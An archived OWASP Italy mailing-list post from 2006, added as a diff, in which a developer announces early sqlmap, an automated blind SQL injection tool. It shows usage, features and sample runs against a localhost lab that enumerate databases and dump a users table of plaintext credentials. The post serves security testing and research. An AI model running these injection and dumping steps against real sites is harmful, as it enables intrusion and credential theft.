@@ -1,0 +1,360 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Owasp-italy] sqlmap v0.0.1
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20sqlmap%20v0.0.1&In-Reply-To=">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="000203.html">
+   <LINK REL="Next"  HREF="000205.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Owasp-italy] sqlmap v0.0.1</H1>
+    <B>Daniele Bellucci</B> 
+    <A HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20sqlmap%20v0.0.1&In-Reply-To="
+       TITLE="[Owasp-italy] sqlmap v0.0.1">daniele.bellucci at gmail.com
+       </A><BR>
+    <I>Fri Jun 30 20:56:07 EDT 2006</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="000203.html">[Owasp-italy] MySQL Injector
+</A></li>
+        <LI>Next message: <A HREF="000205.html">[Owasp-italy] sqlmap v0.0.1
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#204">[ date ]</a>
+              <a href="thread.html#204">[ thread ]</a>
+              <a href="subject.html#204">[ subject ]</a>
+              <a href="author.html#204">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Ciao a tutti,
+
+sono lieto/felice di presentarvi sqlmap un tool per (Automatic Blind SQL
+Injection su variabili GET con valori numerici[AL MOMENTO!!!!]).
+
+Spero di non annoiarvi con questa lunga mail, ma ho pensato (dopo la
+lunga fatica) di riportare il README contenuto all'interno del tgz per
+meglio spiegare di cosa si tratta.
+
+Mi piacerebbe che si riesce a porta il tool come progetto owasp.
+
+
+L'idea e` quella di cui vi accennavo, ossia: costruire un tool che sia
+un &quot;nmap&quot; per sqlinjection e che consenta di enumerare quanto piu`
+possibile su DBMS differenti (al momento soltanto MySQL e` supportato)
+Un tool che raccolga tutte le tecniche di SQLInjection conosciute,
+che faccia ad esempio DBMS Fingerprinting senza fare affidamento al
+banner recuperato etc. etc.
+
+Accetto molto ma molto ma molto ma molto ben volentieri proposto,
+suggerimenti, consigli .. e perche` no, pure qualche insulto ;)
+
+Qui trovato il link per scaricare:
+<A HREF="http://www.linux.it/~belch/?p=17">http://www.linux.it/~belch/?p=17</A>
+
+il sito di riferimento sara` appunto il mio blog ..
+
+
+'notte a tutti
+
+belch.
+
+
+
+
+- -----------------------------------------------------------------------
+
+
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+usage: sqlmap.py [options]
+
+options:
+  -h, --help           show this help message and exit
+  -u URL               http/https url
+  -t URL_TOKEN         token to replace in url
+  -f HEADER_FILE_NAME  load http header from file
+  -d DEFAULT_VALUE     default value for token
+  -e EXPRESSION        expression to evaluate
+  --database=DB        DB to enumerate
+  --table=TABLE        table to enumerate
+  --get-dbs            get available DBs
+  --get-tables         get available tables
+  --get-attributes     get table columns (require: -T optional: -D)
+  --current-database   get current db
+  --current-user       get current user
+  --dump               dump a DB table (require: -T optional: -D)
+  --banner             get DBMS banner/version
+  -v                   be verbose
+
+
+
+CARATTERISTICHE:
+
+[*] al momento solo MySQL e` supportato
+[*] possibilita` di utilizzo di header HTTP &quot;raw&quot;
+[*] enumerazione di tutti i DBs presenti
+[*] enumerazione di tutte le tabelle presenti
+    o di tutte le tabelle associate ad un
+    determinato DB
+[*] enumerazione degli attributi di una tabella
+    associata ad un DB oppure al DB corrente
+[*] enumerazione del DB corrent
+[*] dump formattato di un intera tabella associata ad un DB
+    oppure ad al corrente DB
+[*] enumerazione della versione corrente MySQL
+[*] recupero dell'utente di sistema con il quale e` effettuata
+    la connessione al DB
+[*] algoritmo di enumerazione lineare [O(n)] sul numero di bit
+    della rappresentazione
+[*] evasione dal &quot;magic quote&quot; tramite codifica della stringa
+    con l'operatore CHAR(x,y,z,k)
+[*] esecuzione di uno statement SQL &quot;raw&quot; e recupero del
+    risultato
+
+Le informazioni vengono 'prelevate' da &quot;INFORMATION_SCHEMA&quot;
+e quindi saranno enumerate soltanto tabella/dbs per i quali
+l'utente utilizzato dalla webapp per la connessione al db
+ha il 'grant'
+
+ESEMPI:
+
+Supponiamo di aver determinato che il nostro sito e` vulnerabile
+ad un SQL Injection tramite un qualche meccanismo di fuzzing
+o di &quot;time delaying&quot; e supponiamo che l'URL vulnerabile sia:
+
+<A HREF="http://localhost/blind/showcontent.php?id=1&amp;cat=2">http://localhost/blind/showcontent.php?id=1&amp;cat=2</A>
+
+e supponiamo di aver scoperto che:
+<A HREF="http://localhost/blind/showcontent.php?id=1%20AND%201=1&amp;cat=2">http://localhost/blind/showcontent.php?id=1%20AND%201=1&amp;cat=2</A>
+restituisce al nostro browser la stessa identica pagina di prima.
+
+A questo punto possiamo effettuare SQL Injections andando a manipolare
+la variabile GET: &quot;id&quot; ed utilizzando sqlmap.
+
+Nel caso specifico i parametri fondamentali sono:
+- -u <A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;cat=2">http://localhost/blind/showcontent.php?id=TOKEN&amp;cat=2</A>
+- -t TOKEN
+- -d 1
+
+Questo perche` sqlmap determina quali parametri &quot;fuzzare&quot; specificando
+un TOKEN ed il suo valore di default, ovvero il valore che consente
+di visualizzare correttamente la pagina.
+
+
+Il confronto tra la pagina generata con il &quot;fuzzing&quot; e la pagina di partenza
+viene effettuato tramite comparazione degli hash (MD5) delle due pagine.
+Cameron Hotchkies, in uno speech svolto al Blackhat qualche tempo fa ha
+fatto
+notare che questa tecnica di &quot;comparazione&quot; non e` di certo la migliore
+in quanto
+l'MD5 non ha memoria, ovvero perturbando qualche bit del dato di input
+si ottiene
+un hash completamente differente.
+
+
+- --BANNER GRABBING:
+[503] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --banner
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:00:26
+banner: '5.0.22-Debian_0ubuntu6.06-log'
+
+[*] shutting down at: 02:00:27
+
+
+- --CURRENT USER:
+[505] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --current-user
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:01:01
+current user:   '<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at localhost</A>'
+
+[*] shutting down at: 02:01:01
+
+
+- --CURRENT DATABASE
+[506] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --current-database
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:01:28
+current database:       'blind'
+
+[*] shutting down at: 02:01:28
+
+
+- --DB PRESENTI
+[509] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --get-db
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:02:22available database:
+
+[*] information_schema
+[*] blind
+[*] mysql
+[*] test
+
+[*] shutting down at: 02:02:25
+
+
+
+- --DUMP DI UNA TABELLA
+
+Vediamo ora un esempio concreto che mostra come effettuare il dump di
+tutte le tabelle
+del database 'blind':
+
+Come prima cosa, procuriamoci la lista delle tabelle:
+[510] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --database blind --get-tables
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:03:20
+- -----------------------------
+DATABASE: blind
+- -----------------------------
+news
+users
+- -----------------------------
+
+
+[*] shutting down at: 02:03:21
+
+
+Iniziamo dalla tabella news:
+[511] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --database blind --table news --dump
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:03:41
+DATABASE: blind TABLE: news
+-
+-------------------------------------------------------------------------------------------------
+|<i>news                             |id
+</I>|<i>highlight
+</I>-
+-------------------------------------------------------------------------------------------------
+|<i>ciao da daniele                  |1
+</I>|<i>numero 1
+</I>|<i>sempre ciao da daniele           |2
+</I>|<i>numero 2
+</I>|<i>sempre sempre ciao da daniele    |3
+</I>|<i>numero 3
+</I>-
+-------------------------------------------------------------------------------------------------
+
+
+[*] shutting down at: 02:03:47
+
+
+passiamo ora alla tabella users:
+[512] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- --database blind --table users --dump
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:04:05
+DATABASE: blind TABLE: users
+- -------------------------------------
+|<i>username     |password     |id
+</I>- -------------------------------------
+|<i>daniele      |bellucci     |1
+</I>|<i>mancinelli   |mancio       |2
+</I>- -------------------------------------
+
+[*] shutting down at: 02:04:08
+
+
+- --ESECUZIONE SINGOLI STATEMENT:
+[518] <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">belch at wild</A>:sqlmap/ =&gt; python2.4 ./sqlmap.py -u
+&quot;<A HREF="http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;">http://localhost/blind/showcontent.php?id=TOKEN&amp;c\at=2&quot;</A> -t TOKEN -d 1
+- -e &quot;select version()&quot;
+
+    sqlmap() v0.1 coded by belch &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">daniele.bellucci at gmail.com</A>&gt;
+
+
+[*] starting at: 02:06:15
+select version():       '5.0.22-Debian_0ubuntu6.06-log'
+
+None
+[*] shutting down at: 02:06:16
+
+TODO:
+[*] sostituire il confronto degli Hash con un algoritmo di
+    confronto euristico
+[*] aggiungere classi per gli altri DBMS(Oracle, SQL Server, Postgres)
+[*] aggiungere supporto proxy http
+[*] aggiungere supporto HTTP POST
+[*] aggiungere supporto per &quot;DBMS Fingerprinting&quot; che non utilizzi
+    il banner (recuperato o tramite variabile ODBC @@version, o
+    funzioni analoghe) come fattore discriminante ma bensi`
+    funzioni e caratterestiche indicative di un DBMS
+[*] poiche` i dati SQL sono identificati da parole di dizionario
+    (qualcuno di voi ha mai visto una tabella chiamata: h4g1ha8qwu123 ?!?)
+    i dati enumerati per i nomi degli schemi/tabelle andrebbero memorizzati
+    su un backstore (sqlite?!?) al fine di poter implementare anche
+    attacchi di tipo: &quot;dictionary based&quot;
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.2.2 (GNU/Linux)
+
+iD4DBQFEpcgm09kcuJoOgZARAly/AJQOTneVrolLLoq/3PBdgXAioKZqAKCApSW0
+cMHgmUfqm66gH18SW4L3HA==
+=vGcf
+-----END PGP SIGNATURE-----
+
+
+</PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="000203.html">[Owasp-italy] MySQL Injector
+</A></li>
+	<LI>Next message: <A HREF="000205.html">[Owasp-italy] sqlmap v0.0.1
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#204">[ date ]</a>
+              <a href="thread.html#204">[ thread ]</a>
+              <a href="subject.html#204">[ subject ]</a>
+              <a href="author.html#204">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.owasp.org/mailman/listinfo/owasp-italy">More information about the Owasp-italy
+mailing list</a><br>
+</body></html>
